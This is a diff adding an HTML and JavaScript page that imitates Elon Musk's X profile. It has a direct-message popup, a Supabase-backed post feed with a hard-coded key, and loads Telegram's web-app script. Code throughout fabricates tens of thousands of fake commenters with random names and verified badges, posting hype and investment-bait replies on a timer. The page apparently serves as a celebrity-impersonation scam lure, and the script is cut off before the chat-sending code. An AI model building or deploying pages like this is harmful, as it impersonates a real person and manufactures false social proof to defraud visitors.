@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Elon Musk / X</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #e7e9ea; display: flex; justify-content: center; }
+.phone { width: 100%; max-width: 430px; min-height: 100vh; background: #000; position: relative; border-left: 1px solid #2f3336; border-right: 1px solid #2f3336; padding-bottom: 60px; }
+.cover { height: 200px; background: url("https://images.unsplash.com/photo-1446776811953-b23d57bd21aa?q=80&w=1600&auto=format&fit=crop") center/cover no-repeat; position: relative; }
+.back-btn { position: absolute; top: 16px; left: 16px; color: #fff; font-size: 20px; cursor: pointer; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); border-radius: 50%; }
+.profile-section { padding: 0 16px 12px; position: relative; margin-top: -70px; }
+.avatar-row { display: flex; justify-content: space-between; align-items: flex-end; }
+.avatar { width: 130px; height: 130px; border-radius: 50%; border: 4px solid #000; object-fit: cover; background: #333; }
+.actions { display: flex; gap: 10px; padding-bottom: 10px; }
+.action-btn { height: 36px; padding: 0 18px; border-radius: 999px; border: 1px solid #333; background: transparent; color: #e7e9ea; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+.action-btn:hover { background: rgba(255,255,255,0.1); }
+.action-btn.primary { background: #e7e9ea; color: #000; border: none; }
+.action-btn.primary:hover { background: #d1d5d8; }
+.action-btn.icon-only { width: 36px; padding: 0; display: flex; align-items: center; justify-content: center; font-size: 16px; }
+.user-info { margin-top: 12px; }
+.name { font-size: 20px; font-weight: 800; color: #e7e9ea; display: flex; align-items: center; gap: 4px; }
+.name .verified { color: #1d9bf0; font-size: 18px; }
+.name .x-logo { color: #e7e9ea; font-size: 16px; font-weight: 700; font-family: "Times New Roman", serif; margin-left: 2px; }
+.username { color: #71767b; font-size: 15px; margin-top: 2px; }
+.bio { margin-top: 12px; font-size: 15px; color: #e7e9ea; line-height: 1.4; }
+.joined { margin-top: 12px; color: #71767b; font-size: 14px; display: flex; align-items: center; gap: 4px; }
+.joined i { font-size: 16px; }
+.stats { margin-top: 12px; display: flex; gap: 20px; font-size: 14px; }
+.stats strong { color: #e7e9ea; font-weight: 700; }
+.stats span { color: #71767b; font-weight: 400; }
+.followed-by { margin-top: 12px; display: flex; align-items: center; gap: 8px; color: #71767b; font-size: 13px; }
+.followed-by .mini-avatars { display: flex; }
+.followed-by .mini-avatars img { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #000; margin-left: -6px; }
+.followed-by .mini-avatars img:first-child { margin-left: 0; }
+.followed-by strong { color: #e7e9ea; font-weight: 700; }
+.tabs { display: flex; border-bottom: 1px solid #333; margin-top: 16px; overflow-x: auto; }
+.tabs::-webkit-scrollbar { height: 0; }
+.tab { flex: 1; min-width: 60px; padding: 14px 0; text-align: center; font-size: 14px; font-weight: 700; color: #71767b; cursor: pointer; position: relative; transition: 0.2s; white-space: nowrap; }
+.tab:hover { color: #e7e9ea; background: rgba(255,255,255,0.03); }
+.tab.active { color: #e7e9ea; }
+.tab.active::after { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 56px; height: 4px; background: #1d9bf0; border-radius: 999px; }
+.post { padding: 12px 16px; border-bottom: 1px solid #333; cursor: pointer; transition: 0.15s; }
+.post:hover { background: rgba(255,255,255,0.03); }
+.post-row { display: flex; gap: 12px; }
+.post-avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex-shrink: 0; background: #333; }
+.post-content { flex: 1; min-width: 0; }
+.post-header { font-size: 15px; font-weight: 700; color: #e7e9ea; display: flex; align-items: center; gap: 4px; flex-wrap: wrap; }
+.post-header .post-username { color: #71767b; font-weight: 400; }
+.post-header .dot { color: #71767b; font-weight: 400; }
+.post-header .time { color: #71767b; font-weight: 400; }
+.post-text { font-size: 15px; color: #e7e9ea; margin-top: 2px; line-height: 1.4; white-space: pre-wrap; }
+.media-container { width: 100%; margin-top: 12px; border-radius: 16px; overflow: hidden; border: 1px solid #333; background: #1a1a1a; position: relative; }
+.post-image { width: 100%; max-height: 400px; object-fit: cover; display: block; }
+.post-video { width: 100%; max-height: 400px; object-fit: cover; display: block; }
+.post-iframe { width: 100%; height: 240px; border: none; display: block; }
+.post-actions { display: flex; justify-content: space-between; max-width: 400px; margin-top: 12px; color: #71767b; font-size: 13px; }
+.post-actions div { display: flex; align-items: center; gap: 4px; cursor: pointer; padding: 4px; border-radius: 999px; transition: 0.2s; user-select: none; }
+.post-actions div:hover { color: #1d9bf0; background: rgba(29, 155, 240, 0.1); }
+.post-actions div i { font-size: 16px; pointer-events: none; }
+@keyframes likeAnimation { 0% { transform: scale(1); } 25% { transform: scale(1.3); } 50% { transform: scale(0.95); } 100% { transform: scale(1); } }
+.like-animate { animation: likeAnimation 0.3s ease-in-out; color: #f91880 !important; }
+.liked { color: #f91880 !important; }
+.liked:hover { color: #f91880 !important; background: rgba(249, 24, 128, 0.1) !important; }
+.comments-overlay { display: none; position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 430px; height: 100vh; background: #000; z-index: 2000; flex-direction: column; overflow: hidden; }
+.comments-overlay.active { display: flex; }
+.comments-header { padding: 12px 16px; background: rgba(0,0,0,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid #333; display: flex; align-items: center; gap: 24px; flex-shrink: 0; position: sticky; top: 0; z-index: 10; }
+.comments-back-btn { color: #e7e9ea; font-size: 18px; cursor: pointer; padding: 8px; border-radius: 50%; transition: 0.2s; display: flex; align-items: center; justify-content: center; width: 36px; height: 36px; }
+.comments-back-btn:hover { background: rgba(255,255,255,0.1); }
+.comments-title { font-size: 17px; font-weight: 700; color: #e7e9ea; }
+.comments-body { flex: 1; overflow-y: auto; padding-bottom: 70px; }
+.original-post { padding: 12px 16px; border-bottom: 1px solid #333; }
+.comment-count-header { padding: 12px 16px; color: #71767b; font-size: 13px; border-bottom: 1px solid #222; }
+.comment-input-bar { position: sticky; bottom: 0; background: #000; border-top: 1px solid #333; padding: 8px 16px; display: flex; align-items: center; gap: 12px; z-index: 10; }
+.comment-input-bar .comment-avatar { width: 32px; height: 32px; border-radius: 50%; flex-shrink: 0; }
+.comment-input-bar input { flex: 1; background: transparent; border: none; color: #e7e9ea; font-size: 15px; outline: none; }
+.comment-input-bar input::placeholder { color: #71767b; }
+.comment-reply-btn { background: #1d9bf0; color: #fff; border: none; border-radius: 999px; padding: 8px 20px; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.2s; opacity: 0.5; }
+.comment-reply-btn.active { opacity: 1; }
+.comment-reply-btn.active:hover { background: #1a8cd8; }
+.comment-item { padding: 12px 16px; border-bottom: 1px solid #222; display: flex; gap: 10px; transition: 0.15s; }
+.comment-item:hover { background: rgba(255,255,255,0.02); }
+.comment-avatar-img { width: 32px; height: 32px; border-radius: 50%; flex-shrink: 0; object-fit: cover; }
+.comment-content { flex: 1; min-width: 0; }
+.comment-header { display: flex; align-items: center; gap: 4px; flex-wrap: wrap; font-size: 13px; }
+.comment-name { font-weight: 700; color: #e7e9ea; }
+.comment-username { color: #71767b; }
+.comment-time { color: #71767b; }
+.comment-text { font-size: 14px; color: #e7e9ea; margin-top: 2px; line-height: 1.4; }
+.comment-actions { display: flex; gap: 24px; margin-top: 8px; color: #71767b; font-size: 12px; }
+.comment-actions span { display: flex; align-items: center; gap: 4px; cursor: pointer; padding: 4px; border-radius: 999px; transition: 0.2s; }
+.comment-actions span:hover { color: #1d9bf0; background: rgba(29, 155, 240, 0.1); }
+.bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 430px; height: 56px; background: #000; border-top: 1px solid #2f3336; display: flex; justify-content: space-around; align-items: center; z-index: 999; }
+.bottom-nav div { color: #71767b; font-size: 22px; cursor: pointer; display: flex; align-items: center; justify-content: center; width: 44px; height: 44px; border-radius: 50%; transition: background 0.2s; position: relative; }
+.bottom-nav div:hover { background: rgba(255, 255, 255, 0.1); }
+.bottom-nav div.active { color: #e7e9ea; }
+.bottom-nav .notif-badge .badge { position: absolute; top: 2px; right: 2px; background: #1d9bf0; color: #fff; font-size: 11px; font-weight: 700; padding: 2px 5px; border-radius: 10px; line-height: 1; }
+.fab-btn { position: fixed; bottom: 76px; right: calc(50% - 195px); width: 56px; height: 56px; background: #1d9bf0; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); cursor: pointer; z-index: 998; }
+@media (max-width: 430px) { .fab-btn { right: 16px; } .avatar { width: 100px; height: 100px; } .cover { height: 150px; } .profile-section { margin-top: -55px; } }
+.chat-popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; height: 70vh; max-height: 550px; background: #000; z-index: 1000; flex-direction: column; overflow: hidden; border: 1px solid #333; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
+.chat-header { padding: 14px 16px; background: #000; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
+.chat-header-left { display: flex; align-items: center; gap: 12px; }
+.chat-header-left img { width: 32px; height: 32px; border-radius: 50%; }
+.chat-header-left .chat-name { font-weight: 700; font-size: 15px; color: #e7e9ea; }
+.chat-header-left .chat-status { font-size: 12px; color: #71767b; }
+.chat-close { color: #71767b; font-size: 20px; cursor: pointer; padding: 4px; }
+.chat-close:hover { color: #e7e9ea; }
+.chat-body { flex: 1; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; background: #000; }
+.message { max-width: 82%; padding: 10px 14px; border-radius: 18px; font-size: 14px; line-height: 1.4; word-wrap: break-word; }
+.message.received { background: #1a1a1a; color: #e7e9ea; align-self: flex-start; border-bottom-left-radius: 4px; }
+.message.sent { background: #1d9bf0; color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; }
+.chat-footer { padding: 10px 12px; background: #000; border-top: 1px solid #333; display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+.chat-input { flex: 1; background: #1a1a1a; border: none; border-radius: 20px; padding: 12px 16px; font-size: 16px; color: #e7e9ea; outline: none; }
+.chat-input::placeholder { color: #71767b; }
+.chat-send-btn { background: none; border: none; color: #1d9bf0; font-size: 20px; cursor: pointer; padding: 4px 6px; }
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: #333; border-radius: 999px; }
+::-webkit-scrollbar-thumb:hover { background: #555; }
+</style>
+</head>
+<body>
+
+<div class="phone">
+    <div class="cover"><div class="back-btn"><i class="fa-solid fa-arrow-left"></i></div></div>
+    <div class="profile-section">
+        <div class="avatar-row">
+            <img class="avatar" src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop" alt="Profile">
+            <div class="actions">
+                <button class="action-btn icon-only" onclick="toggleChatWindow()"><i class="fa-regular fa-envelope"></i></button>
+                <button class="action-btn primary">Follow</button>
+            </div>
+        </div>
+        <div class="user-info">
+            <div class="name">Elon Musk<i class="fa-solid fa-circle-check verified"></i><span class="x-logo">𝕏</span></div>
+            <div class="username">@elonmusk</div>
+            <div class="bio">Starmind</div>
+            <div class="joined"><i class="fa-regular fa-calendar"></i> Joined June 2009</div>
+        </div>
+        <div class="stats"><div><strong>1.3K</strong> <span>Following</span></div><div><strong>240.6M</strong> <span>Followers</span></div></div>
+        <div class="followed-by">
+            <div class="mini-avatars">
+                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=100&auto=format&fit=crop" alt="">
+                <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=100&auto=format&fit=crop" alt="">
+                <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?q=80&w=100&auto=format&fit=crop" alt="">
+            </div>
+            <span>Followed by <strong>Dr Brad Stanfield</strong>, <strong>Gary Brecka</strong>, <strong>GRAMMYS</strong>, and <strong>11 others</strong></span>
+        </div>
+        <div class="tabs">
+            <div class="tab active">Posts</div><div class="tab">Replies</div><div class="tab">Subs</div><div class="tab">Highlights</div><div class="tab">Videos</div><div class="tab">Photos</div>
+        </div>
+    </div>
+    <div class="post-feed" id="liveCloudTimelineFeed"></div>
+    <div class="fab-btn"><i class="fa-solid fa-plus"></i></div>
+    <div class="bottom-nav">
+        <div><i class="fa-solid fa-house"></i></div>
+        <div class="active"><i class="fa-solid fa-magnifying-glass"></i></div>
+        <div><i class="fa-solid fa-square-poll-horizontal"></i></div>
+        <div class="notif-badge"><i class="fa-regular fa-bell"></i><span class="badge">20</span></div>
+        <div onclick="toggleChatWindow()"><i class="fa-regular fa-envelope"></i></div>
+    </div>
+    <div class="comments-overlay" id="commentsOverlay">
+        <div class="comments-header"><div class="comments-back-btn" onclick="closeComments()"><i class="fa-solid fa-arrow-left"></i></div><div class="comments-title">Post</div></div>
+        <div class="comments-body" id="commentsBody"></div>
+        <div class="comment-input-bar">
+            <img class="comment-avatar" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=100&auto=format&fit=crop" alt="You">
+            <input type="text" id="commentInput" placeholder="Post your reply" oninput="updateReplyButton()" onkeypress="if(event.key==='Enter') submitComment()">
+            <button class="comment-reply-btn" id="replyBtn" onclick="submitComment()">Reply</button>
+        </div>
+    </div>
+    <div class="chat-popup" id="facebookChatPopup">
+        <div class="chat-header">
+            <div class="chat-header-left">
+                <img src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop" alt="">
+                <div><div class="chat-name">Elon Musk</div><div class="chat-status">Typically replies instantly</div></div>
+            </div>
+            <i class="fa-solid fa-xmark chat-close" onclick="toggleChatWindow()"></i>
+        </div>
+        <div class="chat-body" id="chatContainer"><div class="message received">Hello! How can we assist you today?</div></div>
+        <div class="chat-footer">
+            <input type="text" class="chat-input" id="messageInputField" placeholder="Write a message..." onkeypress="if(event.key==='Enter') sendChatMessage()">
+            <button class="chat-send-btn" onclick="sendChatMessage()"><i class="fa-solid fa-paper-plane"></i></button>
+        </div>
+    </div>
+</div>
+
+<script>
+const SUPABASE_URL = "https://lzzfasgqdztzjpftnxrk.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6emZhc2dxZHp0empwZnRueHJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMzNjQ4OTYsImV4cCI6MjA5ODk0MDg5Nn0.T5pXrst24igk0u6Ujr_-lOvPkNonlilCdPoiwElh7sc";
+const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+function parseMetricToNumber(s) { if(!s||s==='0'||s===0)return 0; var c=String(s).trim().toUpperCase(); if(c.includes('M'))return Math.round(parseFloat(c.replace('M',''))*1000000); if(c.includes('K'))return Math.round(parseFloat(c.replace('K',''))*1000); return parseInt(c.replace(/[^0-9]/g,''))||0; }
+function numberToMetricString(n) { if(n>=1000000){var d=n/1000000;return(d%1===0?d.toFixed(0):d.toFixed(1))+'M';} if(n>=1000){var d=n/1000;return(d%1===0?d.toFixed(0):d.toFixed(1))+'K';} return n.toString(); }
+function formatDisplayCount(n) { if(n===undefined||n===null)return'0'; var num=Math.max(0,Math.floor(n)); if(num>=1000000){var d=num/1000000;return(d%1===0?d.toFixed(0):d.toFixed(1))+'M';} if(num>=1000){var d=num/1000;return(d%1===0?d.toFixed(0):d.toFixed(1))+'K';} return num.toString(); }
+
+var FIRST_NAMES=["Alex","Sarah","Michael","Emily","David","Jessica","Chris","Amanda","James","Jennifer","Robert","Lisa","Daniel","Maria","Kevin","Laura","Brian","Rachel","Thomas","Nicole","Steven","Stephanie","Ryan","Michelle","Jason","Angela","Eric","Melissa","Mark","Kimberly","Scott","Tiffany","Justin","Heather","Brandon","Christina","Andrew","Samantha","Joshua","Patricia","Timothy","Rebecca","Nathan","Cynthia","Aaron","Kathleen","Adam","Amy","Kyle","Sandra","Travis","Brenda","Zachary","Sharon","Jacob","Deborah","Sean","Carolyn","Derek","Margaret","Samuel","Diana","Tyler","Julie","Ethan","Danielle","Jordan","Kelly","Cody","Victoria","Marcus","Jasmine","Lucas","Vanessa","Peter","Allison","Gregory","Janet","Patrick","Monica","Dylan","Madison","Logan","Olivia","Cameron","Sophia","Blake","Isabella","Austin","Mia","Noah","Charlotte","Liam","Amelia","William","Harper","James","Evelyn","Oliver","Abigail","Benjamin","Ella","Elijah","Avery","Lucas","Scarlett","Mason","Grace","Logan","Chloe"];
+var LAST_NAMES=["Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Martinez","Hernandez","Lopez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Thompson","White","Harris","Sanchez","Clark","Lewis","Robinson","Walker","Young","King","Wright","Scott","Torres","Nguyen","Hill","Adams","Baker","Gonzalez","Nelson","Carter","Mitchell","Perez","Roberts","Turner","Phillips","Campbell","Parker","Evans","Edwards","Collins","Stewart","Morris","Murphy","Cook","Rogers","Morgan","Cooper","Peterson","Bailey","Reed","Kelly","Howard","Cox","Ward","Richardson","Watson","Brooks","Wood","Bennett","Gray","James","Reyes","Hughes","Price","Sanders","Myers","Long","Foster","Fisher","Russell","Hamilton","Graham","Sullivan","Wallace","Cole","West","Jordan","Owens","Reynolds","Murray","Ford","Marshall","Hunt","Hicks","Burns","Porter","Warren","Freeman","Austin","Stevens","Knight","Duncan"];
+var VERIFIED_BADGES=[true,false,false,true,false,true,false,false,false,true];
+function genUser(f,l){return['@'+f.toLowerCase()+l.toLowerCase(),'@'+f.toLowerCase()+'_'+l.toLowerCase(),'@'+f.toLowerCase()+'.'+l.toLowerCase(),'@real'+f.toLowerCase(),'@'+f.toLowerCase()+l.charAt(0).toLowerCase(),'@'+f.toLowerCase()+Math.floor(Math.random()*99)][Math.floor(Math.random()*6)];}
+function genAvatar(n){return'https://ui-avatars.com/api/?name='+encodeURIComponent(n)+'&background=random&size=100&bold=true&color=fff';}
+function genTime(){var u=['s','m','h','d'];var t=u[Math.floor(Math.random()*4)];var v;switch(t){case's':v=Math.floor(Math.random()*59)+1;break;case'm':v=Math.floor(Math.random()*59)+1;break;case'h':v=Math.floor(Math.random()*23)+1;break;case'd':v=Math.floor(Math.random()*7)+1;break;}return v+t;}
+function createAgent(n,u,v){return{name:n,username:u,avatar:genAvatar(n),verified:v,time:genTime(),likes:Math.floor(Math.random()*500),replies:Math.floor(Math.random()*50)};}
+function genComment(){var r=["This is incredible! The future is now! 🚀","Absolutely groundbreaking!","Love this! Innovation at its finest! 💯","Mind-blowing stuff as always! 🔥","This changes everything!","The engineering behind this is mind-boggling!","People don't realize how big this is! 🤯","This is why I follow you!","The implications of this are massive!","Game changer! 🌍","Can't stop thinking about this!","This is exactly what we needed! 👏","The execution is flawless!","Every post is better than the last!","This will go down in history! 📈","Absolutely brilliant!","The scale of this is hard to comprehend!","Beyond impressive!","The future is being built right here! 🎯","This is next level! 🚀","Incredible vision as always!","This is why I'm bullish on the future!","The engineering team deserves massive credit!","This solves so many problems! 💪","Never seen anything like this before!","Humanity is moving forward! 🌟","Innovation at the speed of thought!","The data doesn't lie!","First principles thinking at its finest!","This is what peak performance looks like!","Bullish! This is going to be huge! 📈","The ROI on this will be astronomical!","Early investors will be very happy! 💰","This is a trillion-dollar opportunity!","Smart money is paying attention! 👀"];return r[Math.floor(Math.random()*r.length)];}
+
+function genCommentDB(postId,count){count=count||15000;var comments=[];for(var i=0;i<count;i++){var fn=FIRST_NAMES[Math.floor(Math.random()*FIRST_NAMES.length)];var ln=LAST_NAMES[Math.floor(Math.random()*LAST_NAMES.length)];var full=fn+' '+ln;var uname=genUser(fn,ln);var isV=VERIFIED_BADGES[Math.floor(Math.random()*VERIFIED_BADGES.length)];var agent=createAgent(full,uname,isV);comments.push({id:postId+'-comment-'+i,postId:postId,name:agent.name,username:agent.username,avatar:agent.avatar,verified:agent.verified,text:genComment(),time:agent.time,likes:agent.likes,replies:agent.replies,timestamp:Date.now()-Math.floor(Math.random()*7*24*60*60*1000)});}return comments.sort(function(a,b){return b.timestamp-a.timestamp;});}
+
+var commentsStore={};
+var activeCommentPolling=null;
+var userLikedPosts=JSON.parse(localStorage.getItem('likedPosts')||'{}');
+var userLikedComments=JSON.parse(localStorage.getItem('likedComments')||'{}');
+var currentPostId=null;
+var currentPostData=null;
+var knownPostIds=[];
+
+function initCommentStore(postId){if(!commentsStore[postId]){var stored=localStorage.getItem('comments_'+postId);if(stored){commentsStore[postId]=JSON.parse(stored);}else{commentsStore[postId]=genCommentDB(postId,15000+Math.floor(Math.random()*5000));try{localStorage.setItem('comments_'+postId,JSON.stringify(commentsStore[postId].slice(0,5000)));}catch(e){}}}return commentsStore[postId];}
+function getCommentCount(postId){return(commentsStore[postId]||[]).length;}
+
+function parseMediaLayout(rawUrl,specifiedType){if(!rawUrl)return'';if(specifiedType==='video'&&rawUrl.includes('streamable.com')){var id=rawUrl.trim().split('/').pop().split('?')[0];return'<div class="media-container"><iframe src="https://streamable.com/e/'+id+'?autoplay=1&muted=1" class="post-iframe" allow="autoplay" allowfullscreen></iframe></div>';}if(specifiedType==='video')return'<div class="media-container"><video class="post-video" src="'+rawUrl+'" controls muted autoplay loop></video></div>';return'<div class="media-container"><img class="post-image" src="'+rawUrl+'"></div>';}
+
+// =============================================
+// FETCH & RENDER - ALWAYS REFRESHES FROM DATABASE
+// =============================================
+function fetchAndRender() {
+    _supabase.from('posts').select('*').order('created_at',{ascending:false}).then(function(result){
+        var posts=result.data;
+        var error=result.error;
+        if(error){console.error(error.message);return;}
+
+        var feedContainer=document.getElementById('liveCloudTimelineFeed');
+        
+        var newPostIds=(posts||[]).map(function(p){return String(p.id);});
+        var newIdsStr=JSON.stringify(newPostIds);
+        var oldIdsStr=JSON.stringify(knownPostIds);
+        
+        if(newIdsStr===oldIdsStr)return;
+        knownPostIds=newPostIds;
+
+        feedContainer.innerHTML="";
+        if(!posts||posts.length===0){
+            feedContainer.innerHTML='<p style="text-align:center;padding:40px;color:#71767b;font-size:14px;">No posts deployed yet.</p>';
+            return;
+        }
+
+        for(var i=0;i<posts.length;i++){
+            var post=posts[i];
+            var visualMediaBlock=parseMediaLayout(post.media_url,post.media_type);
+            var postId=post.id;
+            var isLiked=userLikedPosts[postId]||false;
+            var baseLikesNum=parseMetricToNumber(post.likes);
+            var displayLikesNum=isLiked?baseLikesNum+1:baseLikesNum;
+            initCommentStore(postId);
+            var commentCount=getCommentCount(postId);
+
+            var div=document.createElement('div');
+            div.className='post';
+            div.setAttribute('data-post-id',postId);
+            div.innerHTML='<div class="post-row"><img class="post-avatar" src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop"><div class="post-content"><div class="post-header">Elon Musk<i class="fa-solid fa-circle-check verified" style="color:#1d9bf0;font-size:14px;"></i><span class="x-logo" style="font-size:14px;color:#e7e9ea;">𝕏</span><span class="post-username">@elonmusk</span><span class="dot">·</span><span class="time">Live</span></div><div class="post-text">'+post.content+'</div>'+visualMediaBlock+'<div class="post-actions"><div class="action-comment" data-post-id="'+postId+'"><i class="fa-regular fa-comment"></i> <span class="comment-count">'+formatDisplayCount(commentCount)+'</span></div><div><i class="fa-solid fa-retweet"></i> '+post.reposts+'</div><div class="action-like '+(isLiked?'liked':'')+'" data-post-id="'+postId+'"><i class="fa-'+(isLiked?'solid':'regular')+' fa-heart"></i> <span class="like-count">'+formatDisplayCount(displayLikesNum)+'</span></div><div><i class="fa-solid fa-chart-simple"></i> '+post.views+'</div><div><i class="fa-regular fa-bookmark"></i></div><div><i class="fa-solid fa-share-nodes"></i></div></div></div></div>';
+
+            (function(pid,pdata){
+                div.querySelector('.action-comment').addEventListener('click',function(e){e.stopPropagation();openComments(pid,pdata);});
+                div.querySelector('.action-like').addEventListener('click',function(e){e.stopPropagation();toggleLike(pid,div.querySelector('.action-like'),pdata);});
+                div.addEventListener('click',function(){openComments(pid,pdata);});
+            })(postId,post);
+            
+            feedContainer.appendChild(div);
+        }
+    });
+}
+
+// =============================================
+// LIKE
+// =============================================
+function toggleLike(postId,likeElement,postData){
+    var isLiked=userLikedPosts[postId]||false;
+    var heartIcon=likeElement.querySelector('i');
+    var likeCountSpan=likeElement.querySelector('.like-count');
+    var currentText=likeCountSpan.textContent;
+    var num=parseMetricToNumber(currentText);
+    if(isLiked){delete userLikedPosts[postId];likeElement.classList.remove('liked');heartIcon.className='fa-regular fa-heart';num=Math.max(0,num-1);}
+    else{userLikedPosts[postId]=true;likeElement.classList.add('liked','like-animate');heartIcon.className='fa-solid fa-heart';num+=1;setTimeout(function(){likeElement.classList.remove('like-animate');},300);}
+    likeCountSpan.textContent=formatDisplayCount(num);
+    localStorage.setItem('likedPosts',JSON.stringify(userLikedPosts));
+    _supabase.from('posts').update({likes:numberToMetricString(num)}).eq('id',postId).then(function(){});
+}
+
+// =============================================
+// COMMENTS
+// =============================================
+function openComments(postId,postData){currentPostId=postId;currentPostData=postData;document.getElementById('commentsOverlay').classList.add('active');document.body.style.overflow='hidden';var comments=initCommentStore(postId);renderCommentsView(postData,comments);if(activeCommentPolling)clearInterval(activeCommentPolling);activeCommentPolling=setInterval(function(){genRandomComment(postId);refreshCommentsDisplay(postId);},3000+Math.random()*5000);}
+function closeComments(){document.getElementById('commentsOverlay').classList.remove('active');document.body.style.overflow='';if(activeCommentPolling){clearInterval(activeCommentPolling);activeCommentPolling=null;}currentPostId=null;currentPostData=null;fetchAndRender();}
+function genRandomComment(postId){var fn=FIRST_NAMES[Math.floor(Math.random()*FIRST_NAMES.length)];var ln=LAST_NAMES[Math.floor(Math.random()*LAST_NAMES.length)];var full=fn+' '+ln;var uname=genUser(fn,ln);var isV=VERIFIED_BADGES[Math.floor(Math.random()*VERIFIED_BADGES.length)];var agent=createAgent(full,uname,isV);var nc={id:postId+'-comment-'+Date.now()+'-'+Math.random(),postId:postId,name:agent.name,username:agent.username,avatar:agent.avatar,verified:agent.verified,text:genComment(),time:'now',likes:0,replies:0,timestamp:Date.now()};if(!commentsStore[postId])commentsStore[postId]=[];commentsStore[postId].unshift(nc);if(commentsStore[postId].length>20000)commentsStore[postId]=commentsStore[postId].slice(0,20000);}
+function renderCommentsView(postData,comments){var body=document.getElementById('commentsBody');var isLiked=userLikedPosts[postData.id]||false;var baseNum=parseMetricToNumber(postData.likes);var dispNum=isLiked?baseNum+1:baseNum;var vmb=parseMediaLayout(postData.media_url,postData.media_type);var cc=comments.length;var html='';for(var i=0;i<Math.min(comments.length,100);i++){var c=comments[i];html+='<div class="comment-item"><img class="comment-avatar-img" src="'+c.avatar+'" onerror="this.src=\'https://ui-avatars.com/api/?name='+encodeURIComponent(c.name)+'&background=random&size=100&bold=true&color=fff\'"><div class="comment-content"><div class="comment-header"><span class="comment-name">'+c.name+'</span>'+(c.verified?'<i class="fa-solid fa-circle-check" style="color:#1d9bf0;font-size:12px;"></i>':'')+'<span class="comment-username">'+c.username+'</span><span class="comment-time">· '+c.time+'</span></div><div class="comment-text">'+c.text+'</div><div class="comment-actions"><span onclick="likeComment(\''+c.id+'\',this)"><i class="fa-'+(userLikedComments[c.id]?'solid':'regular')+' fa-heart" style="color:'+(userLikedComments[c.id]?'#f91880':'#71767b')+'"></i> <span>'+(userLikedComments[c.id]?c.likes+1:c.likes)+'</span></span><span><i class="fa-regular fa-comment"></i> '+c.replies+'</span><span><i class="fa-solid fa-share-nodes"></i></span></div></div></div>';}
+body.innerHTML='<div class="original-post"><div class="post-row"><img class="post-avatar" src="https://images.unsplash.com/photo-1614728263952-84ea256f9679?q=80&w=300&auto=format&fit=crop"><div class="post-content"><div class="post-header">Elon Musk<i class="fa-solid fa-circle-check verified" style="color:#1d9bf0;font-size:14px;"></i><span class="x-logo" style="font-size:14px;color:#e7e9ea;">𝕏</span><span class="post-username">@elonmusk</span><span class="dot">·</span><span class="time">Live</span></div><div class="post-text">'+postData.content+'</div>'+vmb+'<div class="post-actions" style="margin-top:12px;"><div><i class="fa-regular fa-comment"></i> '+formatDisplayCount(cc)+'</div><div><i class="fa-solid fa-retweet"></i> '+postData.reposts+'</div><div class="'+(isLiked?'liked':'')+'" style="cursor:pointer;" onclick="toggleLikeFromComments(\''+postData.id+'\',this)"><i class="fa-'+(isLiked?'solid':'regular')+' fa-heart"></i> <span>'+formatDisplayCount(dispNum)+'</span></div><div><i class="fa-solid fa-chart-simple"></i> '+postData.views+'</div></div></div></div></div><div class="comment-count-header">'+formatDisplayCount(cc)+' replies</div><div id="commentsList">'+html+'</div>';}
